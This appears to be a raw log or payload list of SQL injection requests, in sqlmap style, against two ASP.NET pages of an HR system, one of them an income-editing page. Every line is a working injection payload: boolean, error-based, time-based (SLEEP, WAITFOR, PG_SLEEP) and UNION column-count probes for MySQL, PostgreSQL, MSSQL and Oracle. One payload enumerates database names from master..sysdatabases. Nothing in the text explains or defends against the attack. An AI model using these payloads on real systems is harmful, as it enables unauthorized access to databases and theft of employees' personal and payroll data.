+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-7883' UNION ALL SELECT 'bYWFgjCXav',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6401' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,'oXjXsumier',NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-8329' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'TlSNuKIiNp'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6604' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'XcuRagObNv',NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-7807' UNION ALL SELECT NULL,NULL,NULL,NULL,'hCRUqAMwdN',NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-9808' UNION ALL SELECT NULL,NULL,'kCoOdpqPqJ',NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-4893' UNION ALL SELECT NULL,'OdEJXGTUkQ',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6645' UNION ALL SELECT NULL,NULL,NULL,'bkdqYTaFcM',NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 33,33,33,33,33,'JxZFZBIuuu',33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 33,33,33,33,33,33,33,'eSVPwpJOCH',33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 33,33,33,33,33,33,'gzzuuMdfxv',33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 33,33,33,33,33,33,33,33,'DfkUXefIJU'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 33,33,33,'HKYdgpoXkg',33,33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 33,'tEziEHwffc',33,33,33,33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 'aSxalOIPpH',33,33,33,33,33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 33,33,33,33,'zxNGieAZJi',33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 33,33,'ymzcZQtlNm',33,33,33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-3287' UNION ALL SELECT 33,'EsCGHOFTpD',33,33,33,33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-9559' UNION ALL SELECT 33,33,33,33,33,33,33,33,'ABvOiLmUgg'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-7593' UNION ALL SELECT 33,33,33,33,33,33,'xvNhsvbtSb',33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-4265' UNION ALL SELECT 33,33,33,33,33,33,33,'TfuJANNBbS',33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-5792' UNION ALL SELECT 33,33,'uYgJiGsDhx',33,33,33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-4576' UNION ALL SELECT 33,33,33,'dVPofExLiZ',33,33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-2328' UNION ALL SELECT 33,33,33,33,33,'mXSrCJSPoS',33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1430' UNION ALL SELECT 33,33,33,33,'XWiJiNOWyB',33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6616' UNION ALL SELECT 'oMuXHwEArE',33,33,33,33,33,33,33,33-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,'nzsuqElDBe',NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT 'ULnLptUxIW',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,'kZUoXxIwJB',NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,'WjcsyRanQK',NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'PHelcBPprR',NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'AZPoKKVugv'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,'gkGgcRSgir',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,'zFRbhklCBf',NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,'FpulBobkjj',NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-9679%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,'QGalYmAzhD',NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-7296%' UNION ALL SELECT NULL,'ItQbqyzXLy',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1218%' UNION ALL SELECT NULL,NULL,NULL,'cTBqyXJJXE',NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-8617%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'wUHhhdrPXQ'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-9067%' UNION ALL SELECT NULL,NULL,'lAuLFTrQkM',NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-7087%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,'CnAyHxsNRE',NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-2462%' UNION ALL SELECT NULL,NULL,NULL,NULL,'gAKvUXzUdb',NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6858%' UNION ALL SELECT 'qQrczSUrkc',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-7147%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'RmZXjOWiPG',NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=%' and 1=2 and '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=%' and 1=1 and '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%''''")]][[]'%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 2198=2198 '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND (SELECT 4134 FROM(SELECT COUNT(*),CONCAT(0x3a6666793a,(SELECT (CASE WHEN (4134=4134) THEN 1 ELSE 0 END)),0x3a7a6a663a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 9941=CAST((CHR(58)||CHR(102)||CHR(102)||CHR(121)||CHR(58))||(SELECT (CASE WHEN (9941=9941) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(122)||CHR(106)||CHR(102)||CHR(58)) AS NUMERIC) '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 6658=CONVERT(INT,(CHAR(58)+CHAR(102)+CHAR(102)+CHAR(121)+CHAR(58)+(SELECT (CASE WHEN (6658=6658) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(122)+CHAR(106)+CHAR(102)+CHAR(58))) '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 3181=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(102)||CHR(102)||CHR(121)||CHR(58)||(SELECT (CASE WHEN (3181=3181) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(122)||CHR(106)||CHR(102)||CHR(58)||CHR(62))) FROM DUAL) '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%'; SELECT SLEEP(5) '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%'; SELECT PG_SLEEP(5) '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%'; WAITFOR DELAY '0:0:5' '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND SLEEP(5) '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 2912=(SELECT 2912 FROM PG_SLEEP(5)) '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' WAITFOR DELAY '0:0:5' '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 6096=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(85)||CHR(86)||CHR(103),5) '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' ORDER BY 1 '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 5536=2752 '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate.""]["',.]
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 8904=4537 AND ('OvsE'='OvsE
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 6143=6143 AND ('ukhG'='ukhG
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 6127=5979 AND 'IvhF'='IvhF
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 6143=6143 AND 'Wbji'='Wbji
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 7665=2305 AND 'vyIo'='vyIo
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 1011=1010 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 6143=6143 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 4254=3504 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND (SELECT 6617 FROM(SELECT COUNT(*),CONCAT(0x3a6e68773a,(SELECT (CASE WHEN (6617=6617) THEN 1 ELSE 0 END)),0x3a6f62673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('ZKRx'='ZKRx
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND (SELECT 6617 FROM(SELECT COUNT(*),CONCAT(0x3a6e68773a,(SELECT (CASE WHEN (6617=6617) THEN 1 ELSE 0 END)),0x3a6f62673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xhBS'='xhBS
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND (SELECT 6617 FROM(SELECT COUNT(*),CONCAT(0x3a6e68773a,(SELECT (CASE WHEN (6617=6617) THEN 1 ELSE 0 END)),0x3a6f62673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 4055=CAST((CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58))||(SELECT (CASE WHEN (4055=4055) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)) AS NUMERIC) AND ('EpdE'='EpdE
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 4055=CAST((CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58))||(SELECT (CASE WHEN (4055=4055) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)) AS NUMERIC) AND 'UWzS'='UWzS
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 4055=CAST((CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58))||(SELECT (CASE WHEN (4055=4055) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)) AS NUMERIC) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 4529=CONVERT(INT,(CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(SELECT (CASE WHEN (4529=4529) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58))) AND ('znmH'='znmH
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 4529=CONVERT(INT,(CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(SELECT (CASE WHEN (4529=4529) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58))) AND 'oSwM'='oSwM
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 4529=CONVERT(INT,(CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(SELECT (CASE WHEN (4529=4529) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58))) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 2029=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58)||(SELECT (CASE WHEN (2029=2029) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND ('xyAC'='xyAC
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 2029=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58)||(SELECT (CASE WHEN (2029=2029) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND 'vtUD'='vtUD
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 2029=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58)||(SELECT (CASE WHEN (2029=2029) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 8711-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+CHAR(104)+CHAR(98)+CHAR(88)+CHAR(71)+CHAR(119)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(109)+CHAR(69)+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+CHAR(65)+CHAR(80)+CHAR(108)+CHAR(84)+CHAR(118)+CHAR(102)+CHAR(107)+CHAR(74)+CHAR(72)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+CHAR(65)+CHAR(80)+CHAR(108)+CHAR(84)+CHAR(118)+CHAR(102)+CHAR(107)+CHAR(74)+CHAR(72)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL,NULL,NULL UNION ALL SELECT NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+CHAR(89)+CHAR(120)+CHAR(121)+CHAR(108)+CHAR(89)+CHAR(98)+CHAR(116)+CHAR(82)+CHAR(98)+CHAR(120)+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(CASE WHEN (4618                                                                                                                                                                                                                                                                =                                                                                                                                                                                                                                                                4618) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(CASE WHEN (BINARY_CHECKSUM(4948)=BINARY_CHECKSUM(4948)) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(CASE WHEN (HOST_NAME()=HOST_NAME()) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(CASE WHEN (XACT_STATE()=XACT_STATE()) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(CASE WHEN (SYSDATETIME()=SYSDATETIME()) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58),NULL,NULL,NULL,NULL,NULL FROM master..sysdatabases-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536'](,[[]].]
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 4954=9112 AND ('ePQm'='ePQm
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 9396=9396 AND ('HbYt'='HbYt
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 3046=4779 AND ('gCsd'='gCsd
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 4000=4434 AND 'boMh'='boMh
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 9396=9396 AND 'YVSy'='YVSy
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 8855=9149 AND 'zVQw'='zVQw
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 4943=3881 AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 9396=9396 AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND 5661=4741 AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND (SELECT 2383 FROM(SELECT COUNT(*),CONCAT(0x3a6c75613a,(SELECT (CASE WHEN (2383=2383) THEN 1 ELSE 0 END)),0x3a6470753a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('dbkm'='dbkm
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND (SELECT 2383 FROM(SELECT COUNT(*),CONCAT(0x3a6c75613a,(SELECT (CASE WHEN (2383=2383) THEN 1 ELSE 0 END)),0x3a6470753a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'wFPr'='wFPr
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536%' AND (SELECT 2383 FROM(SELECT COUNT(*),CONCAT(0x3a6c75613a,(SELECT (CASE WHEN (2383=2383) THEN 1 ELSE 0 END)),0x3a6470753a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536') AND 9482=CAST((CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58))||(SELECT (CASE WHEN (9482=9482) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)) AS NUMERIC) AND ('SrpP'='SrpP
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536' AND 9482=CAST((CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58))||(SELECT (CASE WHEN (9482=9482) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)) AS NUMERIC) AND 'Fzpi'='Fzpi
